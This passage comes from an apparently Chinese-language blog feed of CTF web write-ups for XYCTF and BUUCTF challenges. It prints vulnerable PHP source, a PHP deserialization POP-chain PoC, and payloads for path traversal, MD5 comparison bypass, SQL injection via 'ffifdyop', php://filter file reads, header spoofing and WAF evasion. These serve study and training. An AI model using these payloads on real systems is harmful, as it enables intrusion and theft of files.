class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$Liu</span>, <span class="hljs-variable">$T1ng</span>, <span class="hljs-variable">$upsw1ng</span> = Showmaker</span>)</span><br><span class="hljs-function">  </span>&#123;<br>​    <span class="hljs-variable language_">$this</span>-&gt;Liu = <span class="hljs-variable">$Liu</span>;<br>​    <span class="hljs-variable language_">$this</span>-&gt;T1ng = <span class="hljs-variable">$T1ng</span>;<br>​    <span class="hljs-variable language_">$this</span>-&gt;upsw1ng = <span class="hljs-variable">$upsw1ng</span>;<br>  &#125;<br> &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$crypto0</span>, <span class="hljs-variable">$adwa</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>​    <span class="hljs-variable language_">$this</span>-&gt;crypto0 = <span class="hljs-variable">$crypto0</span>;<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XYCTF</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>​    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="hljs-string">&#x27;dev1l&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>) &#123;<br>​      <span class="hljs-keyword">return</span> False;<br>​    &#125; <span class="hljs-keyword">else</span> &#123;<br>​      <span class="hljs-keyword">return</span> True;<br>​    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$KickyMu</span>, <span class="hljs-variable">$fpclose</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>​    <span class="hljs-variable language_">$this</span>-&gt;KickyMu = <span class="hljs-variable">$KickyMu</span>;<br>​    <span class="hljs-variable language_">$this</span>-&gt;fpclose = <span class="hljs-variable">$fpclose</span>;<br>  &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XY</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>​    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;N1ght == <span class="hljs-string">&#x27;oSthing&#x27;</span>) &#123;<br>​      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;WOW, You web is really good!!!\n&quot;</span>;<br>​      <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;X&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Y&#x27;</span>]);<br>​    &#125;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>​    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;KickyMu-&gt;<span class="hljs-title function_ invoke__">XYCTF</span>()) &#123;<br><br>​      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">XY</span>();<br><br>​    &#125;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>])) &#123;<br><br>  <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>]);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&#x27;Crypto0&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO3</span>();<br><br><span class="hljs-variable">$a</span>-&gt;N1ght=<span class="hljs-string">&#x27;oSthing&#x27;</span>;<br><br><span class="hljs-variable">$a</span>-&gt;KickyMu=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO2</span>();<br><br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO1</span>();<br><br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa-&gt;T1ng=<span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>;<br><br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa-&gt;crypto0=<span class="hljs-string">&#x27;dev1l&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>最终命令执行触发点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;X&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Y&#x27;</span>]);<br><span class="hljs-comment">//其中类名由POST请求中的&#x27;X&#x27;键提供，构造函数的参数由POST请求中的&#x27;Y&#x27;键提供。</span><br></code></pre></td></tr></table></figure><p>php原生类读文件 SplFileObject(默认读一行)<br> 所以要结合php伪协议读文件全部内容<br> <strong>X&#x3D;SplFileObject&amp;Y&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong><br>base64解码得flag</p><h2 id="ezPop"><a href="#ezPop" class="headerlink" title="ezPop"></a>ezPop</h2>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/kele6.github.io/2024/04/14/BUUCTF/"/>
    <url>/kele6.github.io/2024/04/14/BUUCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="审计-HTTP-正则"><a href="#审计-HTTP-正则" class="headerlink" title="审计&amp;HTTP&amp;正则"></a>审计&amp;HTTP&amp;正则</h1><h2 id="HCTF-2018-WarmUp-代码审计"><a href="#HCTF-2018-WarmUp-代码审计" class="headerlink" title="[HCTF 2018]WarmUp(代码审计)"></a>[HCTF 2018]WarmUp(代码审计)</h2><p>源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;<strong>flag not here, and flag in ffffllllaaaagggg</strong>&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaagggg</p><p>解析source.php的代码<br><code>if (! empty($_REQUEST[&#39;file&#39;])       &amp;&amp; is_string($_REQUEST[&#39;file&#39;])&amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;       include $_REQUEST[&#39;file&#39;];exit;&#125; else &#123;echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;&#125;</code><br>一步步解析：<br>$_REQUEST</p><pre><code class="hljs">    变量 $_REQUEST用于收集HTML表单提交的数据，默认情况下包含了$_GET，$_POST和$_COOKIE的数组。    GET是从服务器上获取数据，GET是把参数数据队列加到提交表单的ACTION属性所指的URL中，值和表单内各个字段一一对应，在URL中可以看到。    POST是向服务器传送数据，POST是通过HTTP POST机制，将表单内各个字段与其内容放置在HTML HEADER内一起传送到ACTION属性所指的URL地址，用户看不到这个过程。    通过POST和GET方法提交的所有数据都可以通过$_REQUEST[&quot;参数&quot;]获得。</code></pre><p>empty()</p><pre><code class="hljs">    empty(var) 函数用于检查一个变量是否为空，当 变量var 存在，并且是一个非空非零的值时返回 FALSE 否则返回 TRUE。</code></pre><p>is_string()</p><pre><code class="hljs">    is_string(var)检测变量是否是字符串，如果var是字符串则返回true，否则返回false。</code></pre><p>include</p><pre><code class="hljs">    include语句包含并运行指定文件。    文件查找过程：    1、被包含文件先按参数给出的路径寻找。    2、如果没有给出目录（只有文件名）时则按照include_path指定的目录寻找。    3、如果在include_path下没找到该文件，则include最后才在调用脚本文件所在的目录和当前工作目录下寻找。    4、如果最后仍未找到文件则include会发出一条警告。</code></pre><p>逻辑结构</p><pre><code class="hljs">    传入的file参数需满足以下3个条件，才可包含并运行file：    （1）不为空    （2）为字符串    （3）emmm::checkFile($_REQUEST[&#39;file&#39;]) 返回 true</code></pre><p>mb_substr()</p><pre><code class="hljs">    mb_substr ( string $str , int $start , int $length )            mb_substr() 函数从$str的$start字符位置开始，截断$length个字符并返回字符串。$str的第一个字符的位置是 0，第二个字符的位置是 1，以此类推。    类似substr() 函数，substr() 函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</code></pre><p><strong>mb_strpos()</strong></p><p>​    <code>mb_strpos(haystack, needle)，查找字符串needle在另一个字符串haystack中首次出现的位置，返回位置(int)。第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</code></p><p><code>$_page = mb_substr(     $page,     0,     mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); $_page = urldecode($page);</code><br><code>$_page = mb_substr(     $_page,</code><br>    <code>0,</code><br>    <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code><br><code>);</code></p><p>if语句中的$_page经历了如下改变：一次问号截断，一次url解码，一次问号截断——–url传入服务器会自动进行一次urldecode.  ?的url编码为%3F，双重url编码为%253F。</p><p>那问题就很容易解决了<br>payload:?file&#x3D;source.php%253F&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg——-..&#x2F;代表返回上级目录——–..&#x2F;是一个一个试的，未知有几个文件夹</p><h2 id="MRCTF2020-Ez-bypass-md5"><a href="#MRCTF2020-Ez-bypass-md5" class="headerlink" title="MRCTF2020]Ez_bypass(md5)"></a>MRCTF2020]Ez_bypass(md5)</h2><p><strong>代码审计</strong><br>&#x2F;&#x2F; 包含外部文<br>件 ‘flag.php’，该文件可能包含敏感信息<br>include ‘flag.php’;<br>&#x2F;&#x2F; 定义一个变量 $flag，包含一个字符串<br>$flag &#x3D; ‘MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}’;</p><p>&#x2F;&#x2F; 检查是否存在名为 ‘gg’ 和 ‘id’ 的 GET 参数<br>if(isset($_GET[‘gg’]) &amp;&amp; isset($_GET[‘id’])) {<br>    &#x2F;&#x2F; 获取 GET 参数 ‘id’ 和 ‘gg’ 的值<br>    $id &#x3D; $_GET[‘id’];<br>    $gg &#x3D; $_GET[‘gg’];</p><pre><code class="hljs">// 检查 $id 和 $gg 的 MD5 散列值是否相等，并且它们的值不相等，强比较if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;    // 输出 &#39;You got the first step&#39;    echo &#39;You got the first step&#39;;     // 检查是否存在名为 &#39;passwd&#39; 的 POST 参数    if(isset($_POST[&#39;passwd&#39;])) &#123;        // 获取 POST 参数 &#39;passwd&#39; 的值        $passwd = $_POST[&#39;passwd&#39;];         // 检查 $passwd 是否为数字        if (!is_numeric($passwd)) &#123;            // 如果 $passwd 等于 1234567，则输出 &#39;Good Job!&#39;，显示 &#39;flag.php&#39; 的内容，然后终止脚本执行            if($passwd == 1234567) &#123;                echo &#39;Good Job!&#39;;                highlight_file(&#39;flag.php&#39;);                die(&#39;By Retr_0&#39;);            &#125; else &#123;                // 如果 $passwd 不等于 1234567，则输出 &#39;can you think twice??&#39;                echo &quot;can you think twice??&quot;;            &#125;        &#125; else &#123;            // 如果 $passwd 是数字，则输出 &#39;You can not get it !&#39;  可以数字+字母 如：12345a            echo &#39;You can not get it !&#39;;        &#125;    &#125; else &#123;        // 如果不存在 POST 参数 &#39;passwd&#39;，则输出 &#39;only one way to get the flag&#39;        die(&#39;only one way to get the flag&#39;);    &#125;&#125; else &#123;    // 如果 $id 和 $gg 的 MD5 散列值不相等，或者它们的值相等，则输出 &#39;You are not a real hacker!&#39;    echo &quot;You are not a real hacker!&quot;;&#125;</code></pre><p>} else {<br>    &#x2F;&#x2F; 如果不存在 ‘gg’ 和 ‘id’ 的 GET 参数，则输出 ‘Please input first’<br>    die(‘Please input first’);<br>}<br><strong>很常见的md5比较</strong><br><code>若为弱比较：</code></p><p><code>md5加密后为0e开头的会被识别为科学记数法，结果均为0</code></p><p><code>例如：para1=QNKCDZO ，para2=aabg7XSs</code></p><p><code>md5（para1）=0e830400451993494058024219903391</code></p><p><code>md5（para2）=0e087386482136013740957780965295</code></p><p><code>此时MD5（para1）== MD5（para2）</code></p><p>另加：数组绕过&#x2F;?id[]&#x3D;1&amp;gg[]&#x3D;222</p><p><code>若为强比较：</code></p><p><code>如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，并且不会报错，就会得到===强比较的值相等</code></p><p><code>例如：para1[]=111  ,  para2[]=222</code></p><p><code>此时md5（para1）=== md5（para2）</code><br>显而易见 payload：&#x2F;?id[]&#x3D;1&amp;gg[]&#x3D;2  POST:passwd&#x3D;1234567a</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>源代码：发现秘密：Secret.php</p><p>It doesn’t come from ‘<a href="https://Sycsecret.buuoj.cn'==>Referer">https://Sycsecret.buuoj.cn&#39;==&gt;Referer</a></p><p>Please use “Syclover” browser&#x3D;&#x3D;&gt;Uesr Agent </p><p>No!!! you can only read this locally!!!&#x3D;&#x3D;&gt;X-Forwarded-For: 127.0.0.1<br>(另几种表达：X-Real-Ip: 127.0.0.1   Client-Ip: 127.0.0.1)</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>随便查询，无回响，查看源码，发现：<!-- /header end -->HTTP有header&#x3D;&#x3D;&gt;发现<em>Hint select * from ‘admin’ where password&#x3D;md5($pass,true)</em></p><p>一个sql语句，要输入一个密码但是并不知道正确密码。这里需要利用md5绕过，让sql语句变成如下形式  <strong>select * from ‘admin’ where password&#x3D;‘’ or ‘1</strong>（很基本的sql）</p><p><a href="https://www.cnblogs.com/redfish404/articles/17878453.html">https://www.cnblogs.com/redfish404/articles/17878453.html</a></p><p>上网查找后发现字符串“<strong>ffifdyop</strong>”和“129581926211651571912466741651878684928”在进行<a href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">md5加密</a>后形成的十六进制的字符串经过mysql转换成十进制后对应的ASCII码内容为“or ‘ 6……”——ffifdyop-&gt;276f722736c95d99e921722cf9ed621c-&gt;’or’6É]é!r,ùíb</p><p>进入新页面，什么也没有，查看源代码</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>) == md5(<span class="hljs-variable">$b</span>))&#123;<br>    <span class="hljs-comment">// wow, glzjin wants a girl friend.</span><br></code></pre></td></tr></table></figure><p>很基本的md5&#x3D;&#x3D;&gt;0e绕过或者数组绕过都行&#x3D;&#x3D;进入下一步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?phperror_reporting(0);include &quot;flag.php&quot;;<br>highlight_file(__FILE__);<br>if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))<br>&#123;  echo $flag;&#125; <br></code></pre></td></tr></table></figure><p>这个只能数组绕过&#x3D;&#x3D;&gt;param1[]&#x3D;1&amp;param2[]&#x3D;2</p><h2 id="极客大挑战-2019-BuyFlag（数组绕过长度限制）"><a href="#极客大挑战-2019-BuyFlag（数组绕过长度限制）" class="headerlink" title="[极客大挑战 2019]BuyFlag（数组绕过长度限制）"></a>[极客大挑战 2019]BuyFlag（数组绕过长度限制）</h2><p>If you want to buy the FLAG:<br>                                 You must be a student from CUIT!!!<br>                                 You must be answer the correct password!!!  </p><p>源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>~~~post money <span class="hljs-keyword">and</span> password~~~<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>password&#x3D;404a     绕过</p><p>查看HTTP 发现Cookie: user&#x3D;0     0改为1试试</p><p>显示：Pay for the flag!!!hacker!!!</p><p>突然想起来money还要够</p><p>password&#x3D;404a&amp;money&#x3D;100000000</p><p>显示 Nember lenth is too long</p><p>钱减少还不够</p><p>可以尝尝9e9  <strong>password&#x3D;404a&amp;money&#x3D;9e9</strong></p><p>还有一个比较常见的数组绕过    <strong>password&#x3D;404a&amp;money[]&#x3D;1</strong></p><h2 id="极客大挑战-2019-Secret-File-信息泄露、文件包含"><a href="#极客大挑战-2019-Secret-File-信息泄露、文件包含" class="headerlink" title="[极客大挑战 2019]Secret File(信息泄露、文件包含)"></a>[极客大挑战 2019]Secret File(信息泄露、文件包含)</h2><p>页面什么也没有，查看源代码&#x3D;&#x3D;&gt;href&#x3D;”.&#x2F;Archive_room.php”</p><p>打开，点击按钮，提示“没看清么？回去再仔细看看吧。”</p><p>让我们退回去仔细看看，说明在这两个页面之间存在一些内容，右键「检查」<br>返回上一个页面（Archive_room.php）重新点击一次 SECRET 按钮，观察这一过程有哪些「请求」&#x3D;&#x3D;&gt;在结束页面之前，还访问了一个页面&#x2F;action.php，只是我们没有「权限」（302），看不了，所以直接跳过了这个页面。针对这种情况，使用<a href="https://so.csdn.net/so/search?q=burp&spm=1001.2101.3001.7020">burp</a>抓包进行访问<br>发现   secr3t.php   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))<br>&#123;    <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>; <br>   <span class="hljs-keyword">exit</span>();  &#125; <br> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里?&gt;</span><br></code></pre></td></tr></table></figure><p>使用PHP伪协议对文件内容进行编码：&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#x3D;&#x3D;&gt;base64解码</p><h2 id="RoarCTF-2019-Easy-Calc-waf"><a href="#RoarCTF-2019-Easy-Calc-waf" class="headerlink" title="[RoarCTF 2019]Easy Calc(waf)"></a>[RoarCTF 2019]Easy Calc(waf)</h2><p>源码calc.php</p><p>代码审计 num只能输入数字，字母解析不了 用空格绕过”num“改为“ num”</p><p>查看黑名单 引号不能用了 </p><p>用ASCII码绕过</p><p> num&#x3D;var_dump(scandir(chr(47)))&#x3D;&#x3D;&gt;&gt;相当于system(ls &#x2F;)—–chr(47)&#x3D;” &#x2F; “</p><p>发现f1agg文件</p><p>num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))<code>==&gt;&gt;</code>file_get_contents(&#x2F;f1agg)<code>相当于</code>? num&#x3D;system(cat &#x2F;f1agg)</p><h2 id="GXYCTF2019-禁止套娃（正则）"><a href="#GXYCTF2019-禁止套娃（正则）" class="headerlink" title="[GXYCTF2019]禁止套娃（正则）"></a>[GXYCTF2019]禁止套娃（正则）</h2><p>扫描&#x3D;&#x3D;&gt;git泄露&#x3D;&#x3D;&gt;githack&#x3D;&#x3D;&gt;index.php</p><p><code>&lt;?php</code><br><code>include &quot;flag.php&quot;;</code><br><code>echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</code><br><code>if(isset($_GET[&#39;exp&#39;]))&#123;     if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;</code><br>        <code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</code><br>            <code>if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;                 // echo $_GET[&#39;exp&#39;];</code><br>                <code>@eval($_GET[&#39;exp&#39;]);</code><br>            <code>&#125;</code><br>            <code>else&#123;</code><br>                <code>die(&quot;还差一点哦！&quot;);</code><br>            <code>&#125;</code><br>        <code>&#125;</code><br>        <code>else&#123;</code><br>            <code>die(&quot;再好好想想！&quot;);</code><br>        <code>&#125;</code><br>    <code>&#125;</code><br>    <code>else&#123;</code><br>        <code>die(&quot;还想读flag，臭弟弟！&quot;);</code><br>    <code>&#125;</code><br><code>&#125;</code><br><code>// highlight_file(__FILE__);</code><br><code>?&gt;</code></p><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;           echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</code><br>要求上传一个text文件，内容为<code>welcome to the zjctf</code>&#x3D;&#x3D;&gt;使用php:&#x2F;&#x2F;input或者data:&#x2F;&#x2F;<br><strong>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</strong><br><strong>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;  &#x2F;&#x2F;使用base64编码</strong></p><p>file伪协议&#x3D;&#x3D;&gt;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p>进行base解码 得到代码</p><p><code>&lt;?php</code>  </p><p><code>class Flag&#123;  //flag.php       public $file;       public function __tostring()&#123;           if(isset($this-&gt;file))&#123;               echo file_get_contents($this-&gt;file);</code><br>            <code>echo &quot;&lt;br&gt;&quot;;</code><br>        <code>return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</code><br>        <code>&#125;       &#125;   &#125;   ?&gt;</code>  </p><p>进行序列化得到O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><h2 id="极客大挑战-2019-PHP（反序列化）"><a href="#极客大挑战-2019-PHP（反序列化）" class="headerlink" title="[极客大挑战 2019]PHP（反序列化）"></a>[极客大挑战 2019]PHP（反序列化）</h2><p>备份网站&#x3D;&#x3D;&gt;dirsezrch -u <a href="http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==%3Ewww.zip%E6%96%87%E4%BB%B6(%E7%9B%B4%E6%8E%A5%E5%9C%A8url%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E6%8B%BC%E6%8E%A5%E5%B0%B1%E5%8F%AF%E4%BB%A5)">http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==&gt;www.zip文件(直接在url网址后面拼接就可以)</a></p><p>文件夹源码挨个看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php<br><span class="hljs-meta">&lt;?php</span><br><br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br><br>  <span 